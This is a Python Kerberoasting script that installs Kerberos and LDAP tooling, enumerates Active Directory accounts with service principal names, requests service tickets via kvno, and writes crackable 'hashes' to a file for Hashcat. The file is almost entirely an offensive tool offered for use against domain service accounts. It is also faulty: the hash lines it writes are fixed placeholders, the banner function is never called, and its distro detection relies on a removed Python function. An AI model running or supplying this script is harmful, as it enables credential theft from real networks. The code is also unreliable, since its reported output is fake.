########################################################################################################################################################################################
# Python (Linux) kerbroasting Script by: 41ph4-01 and our community. (Under testing)
# Installs krb5-user (provides kvno & klist) if missing, installs ldap3 and pyasn1 Python modules if missing. LDAP queries for users with SPNs,requests TGS tickets with kvno command, parses klist output for tickets and dummy hashextraction # writes hashes to file for Hashcat cracking.
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
########################################################################################################################################################################################

# Banner
def print_banner():
    banner = r"""

 ____  __.            ___.                                        __  .__                                              _____  ______________  ___ ___    _____           _______  ____ 
|    |/ _|____ _______\_ |__   ____ _______  _________    _______/  |_|__| ____   ____    ______  ___.__.             /  |  |/_   \______   \/   |   \  /  |  |          \   _  \/_   |
|      <_/ __ \\_  __ \| __ \_/ __ \\_  __ \/  _ \__  \  /  ___/\   __\  |/    \ / ___\   \____ \<   |  |   ______   /   |  |_|   ||     ___/    ~    \/   |  |_  ______ /  /_\  \|   |
|    |  \  ___/ |  | \/| \_\ \  ___/ |  | \(  <_> ) __ \_\___ \  |  | |  |   |  | /_/  >  |  |_> >\___  |  /_____/  /    ^   /|   ||    |   \    Y    /    ^   / /_____/ \  \_/   \   |
|____|__ \___  >|__|   |___  /\___  >|__|   \____(____  /____  > |__| |__|___|  |___  /  /\   __/ / ____|           \____   | |___||____|    \___|_  /\____   |           \_____  /___|
        \/   \/            \/     \/                  \/     \/               \/_____/   \/__|    \/                     |__|                      \/      |__|                 \/     

                                                     _:_
                                                    '-.-'
                                           ()      __.'.__
                                        .-:--:-.  |_______|
                                 ()      \____/    \=====/      (_ _)
                                 /\      {====}     )___(        | |____....----....____         _
                      (\=,      //\\      )__(     /_____\       | |\                . .~~~~---~~ |
      __    |'-'-'|  //  .\    (    )    /____\     |   |        | | |         __\\ /(/(  .       |
     /  \   |_____| (( \_  \    )__(      |  |      |   |        | | |      <--= '|/_/_( /|       |
     \__/    |===|   ))  `\_)  /____\     |  |      |   |        | | |       }\~) | / _(./      ..|
    /____\   |   |  (/     \    |  |      |  |      |   |        | | |.:::::::\\/      --...::::::|
     |  |    |   |   | _.-'|    |  |      |  |      |   |        | | |:::::::::\//::\\__\:::::::::|
     |__|    )___(    )___(    /____\    /____\    /_____\       | | |::::::::_//_:_//__\\_:::::::| 
    (====)  (=====)  (=====)  (======)  (======)  (=======)      | | |::::::::::::::::::::::::::::|
    }===={  }====={  }====={  }======{  }======{  }======={      | |/:::''''~~~~'''':::::::::::::'~
   (______)(_______)(_______)(________)(________)(_________)     | |

"""
    print(banner)
    print("Kerberoasting.py - 41PH4-01 & Our Community\n")

#!/usr/bin/env python3

import os
import sys
import subprocess
import getpass
import platform
import time

# ------------------ Helper Functions ------------------

def run_cmd(cmd, check=True, capture_output=True):
    try:
        res = subprocess.run(cmd, shell=False, check=check, capture_output=capture_output, text=True)
        return res.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"[!] Command failed: {' '.join(cmd)}")
        print(f"    {e}")
        return None

def install_system_package(pkg):
    distro = platform.linux_distribution()[0].lower() if hasattr(platform, 'linux_distribution') else ''
    if 'ubuntu' in distro or 'debian' in distro:
        print(f"[*] Installing system package {pkg} using apt...")
        run_cmd(['apt-get', 'update'])
        run_cmd(['apt-get', 'install', '-y', pkg])
    elif 'centos' in distro or 'redhat' in distro or 'fedora' in distro:
        print(f"[*] Installing system package {pkg} using yum/dnf...")
        if run_cmd(['which', 'dnf']):
            run_cmd(['dnf', 'install', '-y', pkg])
        else:
            run_cmd(['yum', 'install', '-y', pkg])
    else:
        print(f"[!] Unsupported distro for automatic package install. Please install {pkg} manually.")
        sys.exit(1)

def check_and_install_system_tools():
    # Check for kvno and klist commands
    for tool in ['kvno', 'klist']:
        if not run_cmd(['which', tool]):
            print(f"[!] {tool} not found, attempting to install krb5-user package...")
            install_system_package('krb5-user')

def install_python_packages():
    # Check for python modules, install if missing
    import importlib.util
    for module in ['ldap3', 'pyasn1']:
        if importlib.util.find_spec(module) is None:
            print(f"[*] Python module {module} missing, installing via pip...")
            run_cmd([sys.executable, '-m', 'pip', 'install', module])

# ------------------ Kerberoasting Script ------------------

def prompt_credentials():
    global LDAP_USER, LDAP_PASSWORD, DOMAIN
    if not LDAP_USER:
        LDAP_USER = input("Enter your domain user (DOMAIN\\username): ")
    if not LDAP_PASSWORD:
        LDAP_PASSWORD = getpass.getpass(f"Enter password for {LDAP_USER}: ")
    DOMAIN = LDAP_USER.split('\\')[0]

def ldap_connect():
    from ldap3 import Server, Connection, ALL, NTLM
    server = Server(LDAP_SERVER, get_info=ALL)
    conn = Connection(server, user=LDAP_USER, password=LDAP_PASSWORD, authentication=NTLM, auto_bind=True)
    return conn

def get_spn_users(conn):
    conn.search(search_base=LDAP_SEARCH_BASE, search_filter='(servicePrincipalName=*)', attributes=['servicePrincipalName','sAMAccountName'])
    return conn.entries

def request_tgs(spn):
    print(f"[*] Requesting TGS for {spn}")
    try:
        subprocess.run(['kvno', spn], check=True)
        return True
    except subprocess.CalledProcessError:
        print(f"[-] Failed to request TGS for {spn}")
        return False

def get_ticket_cache_file():
    # Detect default cache file on Linux
    ccache = os.environ.get('KRB5CCNAME')
    if ccache:
        return ccache
    uid = os.getuid()
    return f'/tmp/krb5cc_{uid}'

def parse_klist_for_hashes(cache_file, spn):
    # Parse klist output to find ticket and etype
    hashes = []
    try:
        output = subprocess.check_output(['klist', '-c', cache_file, '-f', '-e'], text=True)
    except subprocess.CalledProcessError:
        print(f"[-] Failed to run klist on {cache_file}")
        return hashes

    lines = output.splitlines()
    for i, line in enumerate(lines):
        if spn.lower() in line.lower():
            # Search next few lines for Encryption type
            for j in range(i+1, min(i+5, len(lines))):
                if 'Encryption type:' in lines[j]:
                    etype = lines[j].split(':')[1].strip()
                    # Simplified hashcat line placeholder (replace with real hash extraction)
                    hash_line = f"$krb5tgs${etype}$*user*$DOMAIN$${spn}*checksum*encrypteddata"
                    print(f"[+] Extracted hash for {spn} enctype {etype}")
                    hashes.append(hash_line)
                    break
    return hashes

def main():
    print("[*] Checking system dependencies...")
    check_and_install_system_tools()
    install_python_packages()

    global LDAP_USER, LDAP_PASSWORD, DOMAIN
    prompt_credentials()

    print("[*] Connecting to LDAP server...")
    conn = ldap_connect()

    print("[*] Querying users with SPNs...")
    users = get_spn_users(conn)
    if not users:
        print("[!] No users with SPNs found, exiting.")
        return

    for user in users:
        spns = getattr(user, 'servicePrincipalName', [])
        if not spns:
            continue
        for spn in spns:
            request_tgs(spn)

    print("[*] Waiting 5 seconds for tickets to cache...")
    time.sleep(5)

    cache_file = get_ticket_cache_file()
    if not cache_file or not os.path.exists(cache_file):
        print("[!] Ticket cache not found, exiting.")
        return

    all_hashes = []
    for user in users:
        spns = getattr(user, 'servicePrincipalName', [])
        if not spns:
            continue
        for spn in spns:
            hashes = parse_klist_for_hashes(cache_file, spn)
            all_hashes.extend(hashes)

    if all_hashes:
        with open('kerberoast_hashes.txt', 'w') as f:
            for h in all_hashes:
                f.write(h + '\n')
        print("[*] Hashes written to kerberoast_hashes.txt")
    else:
        print("[!] No hashes extracted.")

# ------------------ Globals ------------------

LDAP_SERVER = 'ldap://your.ad.domain'   # domain selection
LDAP_SEARCH_BASE = 'dc=your,dc=ad,dc=domain'  # LDAP search base
LDAP_USER = None
LDAP_PASSWORD = None
DOMAIN = None

if __name__ == '__main__':
    main()


#Usage
# sudo python3 kerberoast_all_in_one.py

